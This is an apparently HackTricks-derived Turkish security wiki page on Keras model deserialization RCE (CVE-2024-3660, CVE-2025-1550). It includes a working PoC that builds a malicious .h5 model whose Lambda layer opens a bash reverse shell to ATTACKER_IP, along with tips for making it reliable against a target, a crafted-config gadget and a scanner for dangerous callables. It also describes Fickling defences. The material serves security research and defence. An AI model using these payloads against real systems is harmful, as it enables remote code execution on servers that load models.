# Keras Model Deserialization RCE ve Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, Keras model deserialization pipeline'ına yönelik pratik exploitation tekniklerini özetler, native .keras formatının iç yapısını ve attack surface'ini açıklar ve Model File Vulnerabilities (MFVs) ile post-fix gadget'larını bulmak için bir researcher toolkit sunar.

## .keras model formatının iç yapısı

Bir .keras dosyası en az şunları içeren bir ZIP archive'dır:<sup>[[1]](#references)</sup>
- metadata.json – genel bilgiler (ör. Keras version)
- config.json – model architecture (primary attack surface)
- model.weights.h5 – HDF5 içindeki weights

config.json, recursive deserialization sürecini yönetir: Keras module'leri import eder, class/function'ları resolve eder ve layer/object'leri attacker-controlled dictionary'lerden yeniden oluşturur.<sup>[[1]](#references)</sup>

Dense layer object için örnek snippet:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization şunları gerçekleştirir:<sup>[[1]](#references)</sup>
- module/class_name anahtarlarından module import ve symbol resolution
- saldırgan kontrollü kwargs ile from_config(...) veya constructor çağrısı
- iç içe geçmiş nesnelere (activations, initializers, constraints vb.) recursion

Geçmişte bu durum, config.json oluşturan saldırgana üç primitive sağlıyordu:<sup>[[1]](#references)</sup>
- Hangi modüllerin import edileceğini kontrol etme
- Hangi class/function'ların çözümleneceğini kontrol etme
- Constructor'lara/from_config'e aktarılacak kwargs'ları kontrol etme

## CVE-2024-3660 – Lambda-layer bytecode RCE

Root cause:
- Legacy Lambda deserialization, saldırgan kontrollü marshaled code'dan bir Python function yeniden oluşturuyordu: `func_load()` payload'ı base64-decode eder, `marshal.loads()` çağırır ve bir `FunctionType` oluşturur. Ortaya çıkan function, Lambda çağrıldığında bytecode'unu çalıştırır ve 2.13 öncesindeki etkilenen loader'lar legacy formatlar için safe-mode kontrollerini zorunlu kılmıyordu.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

Native Keras v3 archive içinde Lambda function, `code` alanı base64-encoded marshaled code içeren bir `__lambda__` object olarak temsil edilir:<sup>[[17]](#references)[[18]](#references)</sup>
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"class_name": "__lambda__",
"config": {
"code": "<base64(marshal.dumps(function.__code__))>",
"defaults": null,
"closure": null
}
}
}
}
```
Mitigation:
- Keras, native Keras v3 formatı için varsayılan olarak `safe_mode=True` uygular. `Lambda` içindeki serileştirilmiş Python lambda ifadeleri, kullanıcı `safe_mode=False` ile açıkça devre dışı bırakmadıkça engellenir; bu koruma legacy formatlarını aynı şekilde kapsamaz.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Notes:
- Legacy formatları (eski HDF5 kayıtları) veya eski codebase'ler modern kontrolleri uygulamayabilir; bu nedenle kurbanlar eski loader'ları kullandığında “downgrade” tarzı saldırılar hâlâ uygulanabilir.

## CVE-2025-1550 – Keras 3.0.0–3.8.x sürümlerinde Arbitrary module import

Root cause:
- `_retrieve_class_or_fn`, `config.json` içindeki attacker-controlled module string'leri üzerinde `importlib.import_module(module)` kullanıyordu.
- Impact: Hazırlanmış bir `.keras` arşivi, `safe_mode=True` olsa bile `Model.load_model()` işlevinin attacker tarafından seçilen Python modüllerini ve işlevlerini import etmesini sağlayabilir; import-time side effect'ler ve attacker-controlled argument'ler kullanılabilir.<sup>[[1]](#references)[[4]](#references)</sup>

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Güvenlik iyileştirmeleri (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist: import işlemleri yalnızca resmi ecosystem modülleriyle sınırlandırılmıştır: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True, güvenli olmayan Lambda serialized-function loading işlemlerini engeller
- Basic type checking: deserialize edilen nesneler beklenen türlerle eşleşmelidir

## Pratik exploitation: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Legacy TensorFlow-Keras deployment'ları hâlâ HDF5 model dosyalarını (`.h5`) kabul ediyor olabilir. Bir attacker, sunucunun daha sonra yükleyeceği veya inference çalıştıracağı bir model upload edebiliyorsa, etkilenen loader, attacker-controlled Python içeren bir Lambda layer'ı deserialize edebilir; bu Python daha sonra uygulamanın model workflow'u içinde execute edilebilir.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

Target model'i invoke ettiğinde reverse shell çalıştıran kötü amaçlı bir .h5 oluşturmak için minimal PoC:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Notlar ve güvenilirlik ipuçları:
- Tetiklenme noktaları format ve workflow’a göre değişir; atıfta bulunulan write-up, prediction sırasında payload’ın iki kez çalıştığını gözlemlemiştir. Side effect’leri tekrarlanabilir kabul edin ve payload’ları idempotent hâle getirin.<sup>[[7]](#references)</sup>
- Version pinning: Serialization uyumsuzluklarını önlemek için victim’ın TF/Keras/Python sürümleriyle eşleştirin. Örneğin, hedef bunu kullanıyorsa artifact’leri Python 3.8 ve TensorFlow 2.13.1 altında oluşturun.<sup>[[7]](#references)</sup>
- Hızlı environment replication:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Doğrulama: `os.system("ping -c 1 YOUR_IP")` gibi zararsız bir payload, reverse shell'e geçmeden önce çalıştırmayı doğrulamaya yardımcı olur (ör. `tcpdump` ile ICMP gözlemlenebilir).<sup>[[7]](#references)</sup>

## Allowlist içindeki düzeltme sonrası gadget yüzeyi

Keras module allowlist ve safe mode kullanılsa bile izin verilen callable'lar yan etkilere yol açabilir. Örneğin, `keras.utils.get_file` bir URL'den veri indirir ve bunu yapılandırılmış cache konumunun altına yazar; bu da onu gadget analizi için aday hâline getirir.<sup>[[1]](#references)[[19]](#references)</sup>

Aday Lambda yapılandırması (çağrı imzasını kontrollü bir testte doğrulayın):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Önemli sınırlama:
- `Lambda.call()` model girdisini her zaman ilk positional argument olarak, yapılandırılmış `arguments` değerini ise keyword arguments olarak geçirir. `get_file` için bu positional değer `fname` alanını doldurur; tensor/path uyumsuzluğu, herhangi bir indirme gerçekleşmeden önce bu adayın başarısız olmasına neden olabilir. Bu nedenle garantili çalışan bir gadget değildir.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## AI/ML modelleri için ML pickle import allowlisting (Fickling)

Birçok AI/ML model formatı (PyTorch `.pt`/`.pth`/`.ckpt`, joblib/scikit-learn artifact'ları ve diğer Python-native formatlar) Python pickle verileri içerir. Yukarıdaki legacy Keras Lambda yolu bunun yerine marshaled function bytecode kullanır; dolayısıyla ayrı bir deserialization riskidir. Pickle opcode'ları deserialization sırasında attacker-controlled davranışları, model tampering veya RCE dahil olmak üzere, tetikleyebilir ve basit scanner'lar yeni veya listelenmemiş tehlikeli import'ları gözden kaçırabilir.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Pratik bir fail-closed savunma, Python'ın pickle deserializer'ını hook'layarak unpickling sırasında yalnızca incelenmiş, zararsız ML ile ilgili import'lara izin vermektir. Trail of Bits'in Fickling aracı bu policy'yi uygular ve binlerce public Hugging Face pickle'ından oluşturulmuş, düzenlenmiş bir ML import allowlist'i sunar.<sup>[[8]](#references)[[13]](#references)</sup>

“Güvenli” import'lar için security model (araştırma ve pratikten çıkarılan sezgiler): Bir pickle tarafından kullanılan imported symbol'lar aynı anda şunları yapmalıdır:<sup>[[8]](#references)</sup>
- Kod çalıştırmamalı veya çalıştırılmasına neden olmamalı (compiled/source code object'leri, shelling out, hook'lar vb. olmamalı)
- Rastgele attribute'ları veya item'ları almamalı/ayarlamamalı
- Pickle VM içindeki diğer Python object'lerine referans import etmemeli veya elde etmemeli
- Dolaylı olarak bile olsa secondary deserializer'ları (ör. marshal, nested pickle) tetiklememeli

Fickling'in protections özelliğini process startup sırasında mümkün olduğunca erken etkinleştirin; böylece framework'ler tarafından gerçekleştirilen tüm pickle load işlemleri (`torch.load`, `joblib.load` vb.) kontrol edilir:<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Operasyonel ipuçları:
- Gerektiğinde hooks'ları geçici olarak devre dışı bırakabilir/yeniden etkinleştirebilirsiniz:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Bilinen ve güvenilir bir model engellenirse, sembolleri inceledikten sonra ortamınız için allowlist'i genişletin:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Daha ayrıntılı kontrol tercih ediyorsanız, Fickling generic runtime guard’lar da sunar:<sup>[[9]](#references)</sup>
- `fickling.always_check_safety()` ile tüm `pickle.load()` çağrıları için kontrolleri zorunlu kılın
- Kapsam dahilinde zorunlu kılmak için `with fickling.check_safety():`
- Tek seferlik kontroller için `fickling.load(path)` / `fickling.is_likely_safe(path)`

- Mümkün olduğunda pickle dışı model formatlarını (ör. SafeTensors) tercih edin.<sup>[[15]](#references)</sup> Pickle kabul etmeniz gerekiyorsa, loader’ları network egress olmadan ve least privilege altında çalıştırın ve allowlist’i zorunlu kılın.

Bu allowlist-first strategy, uyumluluğu yüksek tutarken yaygın ML pickle exploit yollarını etkili biçimde engeller. ToB benchmark’ında Fickling, sentetik malicious dosyaların %100’ünü işaretledi ve önde gelen Hugging Face repolarındaki temiz dosyaların yaklaşık %99’una izin verdi.<sup>[[8]](#references)[[10]](#references)</sup>


## Researcher toolkit

1) İzin verilen modüllerde sistematik gadget keşfi

keras, keras_nlp, keras_cv, keras_hub genelindeki aday callable’ları enumerate edin ve file/network/process/env side effect’lerine sahip olanlara öncelik verin.<sup>[[1]](#references)</sup>

<details>
<summary>Allowlist’e alınmış Keras modüllerindeki potansiyel olarak tehlikeli callable’ları enumerate edin</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Doğrudan deserialization testing ( .keras archive gerekmez)

Kabul edilen parametreleri öğrenmek ve yan etkileri gözlemlemek için hazırlanmış dict'leri doğrudan Keras deserializer'larına aktarın.<sup>[[1]](#references)</sup>
```python
import keras

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/x",
"cache_dir": "/tmp/keras-cache"
}
}
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```
3) Sürümler arası probing ve formatlar

Keras, farklı korumalar ve formatlara sahip birden fazla codebase/era içinde bulunur:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, silinmesi planlanıyor)
- tf-keras: ayrı olarak maintain ediliyor
- Multi-backend Keras 3 (official): native .keras formatını kullanıma sundu

Regresyonları veya eksik korumaları ortaya çıkarmak için testleri codebase'ler ve formatlar (.keras ile legacy HDF5) arasında tekrarlayın.

## References

- [1] [Keras Model Deserialization'da Güvenlik Açıklarının Araştırılması (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Serialization'a kontroller eklendi](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits blog – Fickling’in yeni AI/ML pickle file scanner'ı](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – AI/ML ortamlarının güvenliğini sağlama (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle scanning benchmark corpus'u](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Sleepy Pickle attacks arka planı](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors projesi](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Keras 2 Lambda Layers arbitrary code injection'a izin veriyor](https://kb.cert.org/vuls/id/253266)
- [17] [Keras Lambda layer kaynak kodu (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Keras Python utilities kaynak kodu (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [Keras `get_file` API'si](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
